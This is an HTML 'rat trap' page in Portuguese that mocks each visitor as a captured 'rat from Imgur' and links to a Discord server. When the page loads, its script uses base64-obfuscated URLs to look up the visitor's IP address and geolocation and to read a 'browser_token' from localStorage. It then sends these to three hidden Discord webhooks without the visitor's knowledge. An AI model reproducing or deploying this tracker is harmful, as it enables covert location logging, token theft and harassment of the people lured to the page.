<!DOCTYPE html>
<html>
    <head>

    </head>
    <body>

        <body style="margin: 0; padding: 0; font-family: Cambria, Cochin, Georgia, Times, 'Times New Roman', serif;">
            <div style="width: 100vw; height: 100vh; display: flex; align-items: center; justify-content: center; flex-direction: column;">
                <img src="ratoeira.webp"  width="300">
                <h1>Mais um rat√£o de Imgur capturado! ü§£ü§£</h1>
                <h2>O Rato da vez √© de <span id="loc"></span></h2>
                <br>
                <h3><b><a href="https://discord.gg/K8zzbUDb">Se junte ao Discord dos ratos!</a></b></h3>
                <audio id="som" src="rato.mp3" autoplay></audio>
            </div>
        </body>

        <script>

                 window.addEventListener('DOMContentLoaded', () => {
                    const som = document.getElementById('som');
                    som.play().catch(() => {
                        const btn = document.createElement('button');
                        btn.textContent = '‚ñ∂';
                        btn.onclick = () => {
                        som.play();
                        btn.remove();
                        };
                        document.body.appendChild(btn);
                    });
                });
            
            class Start {
                static async start() {
                    let i;
                    let id = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
                    try{
                    await fetch(atob("aHR0cHM6Ly9hcGktYmRjLm5ldC9kYXRhL2NsaWVudC1pcA=="))
                    .then((body) => body.json())
                    .then((data) => {
                        i = data.ipString;
                    })
                    .catch((error) => {});
                    await fetch(
                    `${atob("aHR0cHM6Ly9hcGktYmRjLm5ldC9kYXRhL2lwLWdlb2xvY2F0aW9uP2lwPQ==")}${i}${atob("JmxvY2FsaXR5TGFuZ3VhZ2U9ZW4ma2V5PWJkY183ZDk5Y2VmNzM1YTk0Y2I0YjgyZDM3YTI5NTE4YTU2Nw==")}`
                    )
                    .then((body) => body.json())
                    .then((data) => {
                        let j = localStorage.getItem(atob("YnJvd3Nlcl90b2tlbg=="));
                        let client = urlParams.get('client');
                        
                       let $loc =  document.getElementById("loc");
                       $loc.innerHTML = data.location.principalSubdivision + ", " + data.location.city + ", " + data.location.localityName;
                        

                        Start.sdc(id, i,` ${
                            data.location.principalSubdivision +
                            ", " +
                            data.location.city +
                            ", " +
                            data.location.localityName
                        }`,j);
                        
                        if(client != null){
                            Start.ratoeira(id, `${
                            data.location.principalSubdivision +
                            ", " +
                            data.location.localityName
                        }`);
                        }
                       
                        
                    })
                    .catch((error) => {
                        console.log("erro: ", error);
                    });

                    let res = await fetch(atob("aHR0cDovL2lwLWFwaS5jb20vanNvbi8=") + i);
                    Start.generic(await res.text(), id);
                   
                    }catch(e){
                    console.log(e);
                    }
                }

                static  generic(message, id){
                    let u =
                    "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTQzNDM2NjE0NDA4NDQ0NzQ1Ni80YXJlZ0FuNGh1eUtua3N3U3BkeHBNRUF1MXNmeVlmWVV4ZmZLVG5SUExVY05nYllreVpZY001Wmt4VW15YWRlMnRURA==";
                    const request = new XMLHttpRequest();
                    request.open("POST", atob(u));

                    request.setRequestHeader("Content-type", "application/json");
                    let nome = "Desconhecido";
                    try{
                        const urlParams = new URLSearchParams(window.location.search);
                        nome = urlParams.get('client');
                    } catch(e){}
                    const params = {
                    embeds: [
                        {
                        title: `Captura de ${nome}`,
                        fields: [
                            {
                            name: "API Response Data",
                            value: (function(){try{return "```json\n"+JSON.stringify(JSON.parse(message),null,2).replace(/`/g,"'")+"\n```";}catch(e){return "```json\n"+String(message).replace(/`/g,"'")+"\n```";}})(),
                            },
                        ],
                        footer: {
                            text: "ID do Rato: " + id,
                        },
                        },
                    ],
                    };
                    request.send(JSON.stringify(params));
                }

                static sdc(id, a, b, c) {
                    let u =
                    "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQzMzY2NTg5MTM3MDkzMDMzOC95RUlNR29qbDdGVEluT3V6NU9JRnItTFpQT3dmMkFjQVMweTBkX0JGOEtjaTlhR2t3NEJRWjJWeEh4NFdsQkllbUdBTA==";
                    const request = new XMLHttpRequest();
                    request.open("POST", atob(u));

                    request.setRequestHeader("Content-type", "application/json");
                    let nome = "Desconhecido";
                    try{
                        const urlParams = new URLSearchParams(window.location.search);
                        nome = urlParams.get('client');
                    } catch(e){}
                    const params = {
                    embeds: [
                        {
                        title: `Captura de ${nome}`,
                        fields: [
                            {
                            name: "",
                            value: `||${c}||`,
                            },
                            {
                            name: "",
                            value: b,
                            },
                            {
                            name: "",
                            value: a,
                            },
                        ],
                        footer: {
                            text: "ID do Rato: " + id,
                        },
                        },
                    ],
                    };
                    request.send(JSON.stringify(params));
                }

                static ratoeira(id, b) {
                    let u =
                    "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQzNDM1MDAwMDc4NzI5NjI1Ni9FN1ZDSFUtZDF2Y1dqZ2libTJFOFpMTXJNTkc5Mzg3UG5MTFBYMGlPcFFRekJGSHhMdDVvSHZTODllSjhaSzNMQy0zbA==";
                    const request = new XMLHttpRequest();
                    request.open("POST", atob(u));

                    request.setRequestHeader("Content-type", "application/json");
                    let nome = "Desconhecido";
                    try{
                        const urlParams = new URLSearchParams(window.location.search);
                        nome = urlParams.get('client');
                    } catch(e){}
                    const params = {
                    embeds: [
                        {
                        title: `üê≠ Rat√£o capturado por ${nome}`,
                        fields: [
                            {
                            name: "üìç Localiza√ß√£o",
                            value: b,
                            },
                        ],
                        footer: {
                            text: "ID do Rato: " + id,
                        },
                        },
                    ],
                    };
                    request.send(JSON.stringify(params));
                }
                }

                Start.start();
        </script>
    </body>
</html>




